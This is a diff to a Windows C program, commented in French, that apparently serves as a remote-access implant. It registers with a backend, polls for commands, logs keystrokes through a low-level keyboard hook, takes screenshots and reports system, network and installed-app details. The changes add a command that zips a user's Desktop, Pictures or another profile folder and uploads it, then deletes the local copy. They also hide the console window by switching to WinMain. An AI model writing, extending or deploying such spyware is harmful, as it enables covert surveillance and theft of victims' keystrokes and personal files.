@@ -140,12 +140,13 @@ static void get_hostname(char *buf, int sz) {
         strncpy(buf, "unknown", sz - 1);
 }
 
-/* Lit ProductName + CurrentBuildNumber depuis le registre.
-   GetVersionEx est déprécié sur Windows 8.1+. */
+/* ProductName dans le registre dit "Windows 10" même sur Windows 11.
+   On corrige en vérifiant CurrentBuildNumber (>= 22000 = Windows 11). */
 static void get_os_version(char *buf, int sz) {
     HKEY hKey;
-    char product[128] = "Windows";
-    char build[32]    = "0";
+    char product[128]    = "Windows";
+    char build[32]       = "0";
+    char display_ver[32] = "";
 
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
             "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
@@ -157,9 +158,21 @@ static void get_os_version(char *buf, int sz) {
         len = sizeof(build);
         RegQueryValueExA(hKey, "CurrentBuildNumber",
                          NULL, &type, (BYTE *)build, &len);
+        len = sizeof(display_ver);
+        RegQueryValueExA(hKey, "DisplayVersion",
+                         NULL, &type, (BYTE *)display_ver, &len);
         RegCloseKey(hKey);
     }
-    snprintf(buf, sz, "%s (Build %s)", product, build);
+
+    if (atoi(build) >= 22000) {
+        char *p = strstr(product, "Windows 10");
+        if (p) memcpy(p + 8, "11", 2);
+    }
+
+    if (display_ver[0])
+        snprintf(buf, sz, "%s %s (Build %s)", product, display_ver, build);
+    else
+        snprintf(buf, sz, "%s (Build %s)", product, build);
 }
 
 /* --- Réseau ------------------------------------------------------------- */
@@ -204,10 +217,8 @@ static void get_public_ip(char *buf, int sz) {
     InternetCloseHandle(hInet);
 }
 
-/* Retourne un objet JSON avec le DNS global + un tableau d'interfaces */
 static void get_net_config(char *out, int sz) {
     char dns[64] = "unknown";
-
     FIXED_INFO *fi = (FIXED_INFO *)malloc(sizeof(FIXED_INFO));
     if (fi) {
         DWORD fi_sz = sizeof(FIXED_INFO);
@@ -245,7 +256,7 @@ static void get_net_config(char *out, int sz) {
 /* --- Screenshot (GDI32, BMP 24 bits) ----------------------------------- */
 
 static int take_screenshot(const char *out_path) {
-    FILE   *f    = NULL;  /* init ici : goto cleanup doit trouver f initialisée */
+    FILE   *f    = NULL;
     char   *bits = NULL;
 
     int w = GetSystemMetrics(SM_CXSCREEN);
@@ -263,7 +274,7 @@ static int take_screenshot(const char *out_path) {
     ZeroMemory(&bih, sizeof(bih));
     bih.biSize        = sizeof(BITMAPINFOHEADER);
     bih.biWidth       = w;
-    bih.biHeight      = -h;  /* négatif = top-down */
+    bih.biHeight      = -h;
     bih.biPlanes      = 1;
     bih.biBitCount    = 24;
     bih.biCompression = BI_RGB;
@@ -278,7 +289,7 @@ static int take_screenshot(const char *out_path) {
 
     BITMAPFILEHEADER bfh;
     ZeroMemory(&bfh, sizeof(bfh));
-    bfh.bfType    = 0x4D42;  /* 'BM' */
+    bfh.bfType    = 0x4D42;
     bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
     bfh.bfSize    = bfh.bfOffBits + img_sz;
 
@@ -300,7 +311,6 @@ cleanup:
 
 /* --- Keylogger (WH_KEYBOARD_LL) ---------------------------------------- */
 
-/* Hook bas niveau — le thread installeur doit avoir une boucle de messages. */
 static LRESULT CALLBACK keyboard_hook_proc(int nCode,
                                             WPARAM wParam, LPARAM lParam)
 {
@@ -327,9 +337,8 @@ static LRESULT CALLBACK keyboard_hook_proc(int nCode,
                 case VK_ESCAPE:  strcpy(key, "[ESC]"); break;
                 case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
                 case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
-                case VK_MENU:    break;
-                default:
-                    snprintf(key, sizeof(key), "[VK%02X]", vk); break;
+                case VK_MENU: break;
+                default: snprintf(key, sizeof(key), "[VK%02X]", vk); break;
             }
         }
 
@@ -352,7 +361,6 @@ static void start_keylog(void) {
     g_keylog_active = TRUE;
 }
 
-/* Arrête le hook et envoie le buffer accumulé au backend */
 static void stop_keylog(void) {
     if (!g_hook) return;
     g_keylog_active = FALSE;
@@ -370,6 +378,19 @@ static void stop_keylog(void) {
 }
 
 /* --- Applications installées (registre) -------------------------------- */
+
+/* Échappe une chaîne pour l'inclure dans un string JSON. */
+static void json_escape(char *out, int out_sz, const char *in) {
+    int i = 0, j = 0;
+    while (in[i] && j < out_sz - 2) {
+        unsigned char c = (unsigned char)in[i++];
+        if      (c == '"'  && j+2 < out_sz-1) { out[j++]='\\'; out[j++]='"';  }
+        else if (c == '\\' && j+2 < out_sz-1) { out[j++]='\\'; out[j++]='\\'; }
+        else if (c >= 0x20)                    { out[j++]=(char)c; }
+        /* ignore les caractères de contrôle */
+    }
+    out[j] = '\0';
+}
 
 static void get_installed_apps(char *out, int sz) {
     static const char *REG_KEYS[] = {
@@ -396,22 +417,23 @@ static void get_installed_apps(char *out, int sz) {
             if (RegOpenKeyExA(hKey, sub, 0, KEY_READ, &hSub) != ERROR_SUCCESS)
                 continue;
 
-            char  name[256]   = "";
-            char  version[64] = "";
+            char  raw_name[256]    = "";
+            char  raw_version[64]  = "";
             DWORD type, len;
 
-            len = sizeof(name);
+            len = sizeof(raw_name);
             RegQueryValueExA(hSub, "DisplayName",
-                             NULL, &type, (BYTE *)name, &len);
-            len = sizeof(version);
+                             NULL, &type, (BYTE *)raw_name, &len);
+            len = sizeof(raw_version);
             RegQueryValueExA(hSub, "DisplayVersion",
-                             NULL, &type, (BYTE *)version, &len);
+                             NULL, &type, (BYTE *)raw_version, &len);
             RegCloseKey(hSub);
 
-            if (name[0] == '\0') continue;
+            if (raw_name[0] == '\0') continue;
 
-            for (int i = 0; name[i];    i++) if (name[i]    == '"') name[i]    = '\'';
-            for (int i = 0; version[i]; i++) if (version[i] == '"') version[i] = '\'';
+            char name[512], version[128];
+            json_escape(name,    sizeof(name),    raw_name);
+            json_escape(version, sizeof(version), raw_version);
 
             if (!first) pos += snprintf(out + pos, sz - pos, ",");
             first = 0;
@@ -422,6 +444,131 @@ static void get_installed_apps(char *out, int sz) {
         RegCloseKey(hKey);
     }
     snprintf(out + pos, sz - pos, "]");
+}
+
+/* --- ZIP writer (stored, sans compression) ----------------------------- */
+
+typedef struct { char *data; DWORD size; DWORD cap; } ZipBuf;
+
+static void zip_append(ZipBuf *z, const void *d, DWORD n) {
+    if (z->size + n > z->cap) {
+        z->cap = (z->size + n) * 2 + 4096;
+        z->data = (char *)realloc(z->data, z->cap);
+    }
+    memcpy(z->data + z->size, d, n);
+    z->size += n;
+}
+static void zip_u16(ZipBuf *z, WORD v)  { zip_append(z, &v, 2); }
+static void zip_u32(ZipBuf *z, DWORD v) { zip_append(z, &v, 4); }
+
+/* CRC32 (algorithme standard, table initialisée à la première utilisation) */
+static DWORD g_crc_table[256];
+static BOOL  g_crc_ready = FALSE;
+
+static DWORD calc_crc32(const BYTE *data, DWORD len) {
+    if (!g_crc_ready) {
+        for (DWORD i = 0; i < 256; i++) {
+            DWORD c = i;
+            for (int k = 0; k < 8; k++)
+                c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
+            g_crc_table[i] = c;
+        }
+        g_crc_ready = TRUE;
+    }
+    DWORD crc = 0xFFFFFFFF;
+    for (DWORD i = 0; i < len; i++)
+        crc = g_crc_table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
+    return crc ^ 0xFFFFFFFF;
+}
+
+typedef struct { DWORD offset; char name[MAX_PATH]; } ZipEntry;
+
+static BOOL zip_add_file(ZipBuf *z, ZipEntry *entries, int *nent,
+                         const char *filepath, const char *arcname)
+{
+    if (*nent >= 1023) return FALSE;
+
+    HANDLE hf = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
+                            NULL, OPEN_EXISTING, 0, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return FALSE;
+
+    DWORD fsz = GetFileSize(hf, NULL);
+    /* ignore les fichiers > 20 MB pour éviter de saturer la mémoire */
+    if (fsz == INVALID_FILE_SIZE || fsz > 20 * 1024 * 1024) {
+        CloseHandle(hf); return FALSE;
+    }
+
+    BYTE *buf = (BYTE *)malloc(fsz ? fsz : 1);
+    if (!buf) { CloseHandle(hf); return FALSE; }
+    DWORD rd = 0;
+    ReadFile(hf, buf, fsz, &rd, NULL);
+    CloseHandle(hf);
+
+    DWORD crc     = calc_crc32(buf, fsz);
+    WORD  namelen = (WORD)strlen(arcname);
+
+    entries[*nent].offset = z->size;
+    strncpy(entries[*nent].name, arcname, MAX_PATH - 1);
+    (*nent)++;
+
+    zip_u32(z, 0x04034B50); zip_u16(z, 20); zip_u16(z, 0);
+    zip_u16(z, 0);          zip_u16(z, 0);  zip_u16(z, 0);
+    zip_u32(z, crc); zip_u32(z, fsz); zip_u32(z, fsz);
+    zip_u16(z, namelen); zip_u16(z, 0);
+    zip_append(z, arcname, namelen);
+    zip_append(z, buf, fsz);
+    free(buf);
+    return TRUE;
+}
+
+/* Parcourt folder_path (niveau 1) et crée un ZIP dans out_zip_path. */
+static BOOL create_folder_zip(const char *folder_path,
+                               const char *out_zip_path)
+{
+    ZipBuf   z       = {NULL, 0, 0};
+    ZipEntry entries[1024];
+    int      nent    = 0;
+
+    char pattern[MAX_PATH];
+    snprintf(pattern, MAX_PATH, "%s\\*", folder_path);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+            char full[MAX_PATH * 2];
+            snprintf(full, sizeof(full), "%s\\%s", folder_path, fd.cFileName);
+            zip_add_file(&z, entries, &nent, full, fd.cFileName);
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+
+    if (nent == 0) { free(z.data); return FALSE; }
+
+    /* Répertoire central */
+    DWORD cd_offset = z.size;
+    for (int i = 0; i < nent; i++) {
+        /* Lit crc/tailles dans le local header (offset +14) */
+        DWORD *lh    = (DWORD *)(z.data + entries[i].offset + 14);
+        WORD   nl    = (WORD)strlen(entries[i].name);
+        zip_u32(&z, 0x02014B50); zip_u16(&z, 20); zip_u16(&z, 20);
+        zip_u16(&z, 0); zip_u16(&z, 0); zip_u16(&z, 0); zip_u16(&z, 0);
+        zip_u32(&z, lh[0]); zip_u32(&z, lh[1]); zip_u32(&z, lh[2]);
+        zip_u16(&z, nl); zip_u16(&z, 0); zip_u16(&z, 0);
+        zip_u16(&z, 0);  zip_u16(&z, 0); zip_u32(&z, 0);
+        zip_u32(&z, entries[i].offset);
+        zip_append(&z, entries[i].name, nl);
+    }
+    DWORD cd_size = z.size - cd_offset;
+    zip_u32(&z, 0x06054B50); zip_u16(&z, 0); zip_u16(&z, 0);
+    zip_u16(&z, (WORD)nent); zip_u16(&z, (WORD)nent);
+    zip_u32(&z, cd_size); zip_u32(&z, cd_offset); zip_u16(&z, 0);
+
+    FILE *f = fopen(out_zip_path, "wb");
+    if (f) { fwrite(z.data, z.size, 1, f); fclose(f); }
+    free(z.data);
+    return f != NULL;
 }
 
 /* --- Dispatch + main ---------------------------------------------------- */
@@ -451,10 +598,12 @@ static void handle_command(const char *cmd) {
         http_post_json(path, "{\"result\":\"keylog sent\"}", NULL, 0);
 
     } else if (strcmp(cmd, "apps") == 0) {
+        /* Le frontend attend {type:'json', data:[...]} */
         char *buf  = (char *)malloc(65536);
-        char *json = (char *)malloc(65536 + 32);
+        char *json = (char *)malloc(65536 + 64);
         get_installed_apps(buf, 65536);
-        snprintf(json, 65536 + 32, "{\"result\":%s}", buf);
+        snprintf(json, 65536 + 64,
+                 "{\"result\":{\"type\":\"json\",\"data\":%s}}", buf);
         snprintf(path, sizeof(path),
                  "/api/machines/%d/result", g_machine_id);
         http_post_json(path, json, NULL, 0);
@@ -462,13 +611,49 @@ static void handle_command(const char *cmd) {
 
     } else if (strcmp(cmd, "net_config") == 0) {
         char *buf  = (char *)malloc(16384);
-        char *json = (char *)malloc(16384 + 32);
+        char *json = (char *)malloc(16384 + 64);
         get_net_config(buf, 16384);
-        snprintf(json, 16384 + 32, "{\"result\":%s}", buf);
+        snprintf(json, 16384 + 64,
+                 "{\"result\":{\"type\":\"json\",\"data\":%s}}", buf);
         snprintf(path, sizeof(path),
                  "/api/machines/%d/result", g_machine_id);
         http_post_json(path, json, NULL, 0);
         free(buf); free(json);
+
+    } else if (strncmp(cmd, "files:", 6) == 0) {
+        const char *folder_name = cmd + 6;
+
+        /* Résout le chemin selon le nom de dossier reçu */
+        char userprofile[MAX_PATH];
+        if (!GetEnvironmentVariableA("USERPROFILE",
+                                      userprofile, MAX_PATH))
+            strncpy(userprofile, "C:\\Users\\Public", MAX_PATH - 1);
+
+        char folder_path[512];
+        if      (strcmp(folder_name, "Bureau") == 0)
+            snprintf(folder_path, sizeof(folder_path), "%s\\Desktop",  userprofile);
+        else if (strcmp(folder_name, "Images") == 0)
+            snprintf(folder_path, sizeof(folder_path), "%s\\Pictures", userprofile);
+        else
+            snprintf(folder_path, sizeof(folder_path), "%s\\%s",
+                     userprofile, folder_name);
+
+        char zip_name[64];
+        snprintf(zip_name, sizeof(zip_name), "%s.zip", folder_name);
+
+        snprintf(path, sizeof(path),
+                 "/api/machines/%d/result", g_machine_id);
+
+        if (create_folder_zip(folder_path, zip_name)) {
+            snprintf(path, sizeof(path),
+                     "/api/machines/%d/upload", g_machine_id);
+            http_post_file(path, zip_name, "file");
+            DeleteFileA(zip_name);
+        } else {
+            /* Envoie quand même un résultat pour vider pending_command */
+            http_post_json(path,
+                "{\"result\":\"no files found\"}", NULL, 0);
+        }
     }
 }
 
@@ -493,7 +678,12 @@ static int do_register(void) {
     return p ? atoi(p + 5) : -1;
 }
 
-int main(void) {
+/* WinMain + -mwindows → pas de fenêtre console visible */
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
+                   LPSTR lpCmd, int nShow)
+{
+    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
+
     g_machine_id = do_register();
     if (g_machine_id < 0) return 1;
 
@@ -501,7 +691,6 @@ int main(void) {
     MSG   msg;
 
     while (1) {
-        /* Traite les messages Windows — requis pour WH_KEYBOARD_LL */
         while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
@@ -518,7 +707,6 @@ int main(void) {
             char resp[256] = "";
             http_get(poll_path, resp, sizeof(resp));
 
-            /* Parse {"command": "xxx"} ou {"command": null} */
             const char *p = strstr(resp, "\"command\":");
             if (p) {
                 p += 10;
